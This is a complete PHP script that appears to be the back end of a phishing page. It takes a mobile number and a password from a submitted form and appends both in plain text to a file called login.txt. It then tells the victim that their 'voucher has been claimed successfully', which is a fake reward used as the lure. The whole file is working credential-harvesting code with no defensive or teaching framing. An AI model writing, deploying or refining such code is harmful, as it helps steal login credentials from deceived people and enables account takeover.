<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $mobile = $_POST['mobile'];
    $password = $_POST['password'];

    // Define the file where the data will be saved
    $filename = 'login.txt';

    // Open the file for writing
    $file = fopen($filename, 'a');

    // Write the data to the file
    fwrite($file, "Mobile Number: " . $mobile . "\n");
    fwrite($file, "Password: " . $password . "\n");
    fwrite($file, "-----------------------------\n");

    // Close the file
    fclose($file);

    echo "Your voucher has been claimed successfully!";
}
?>
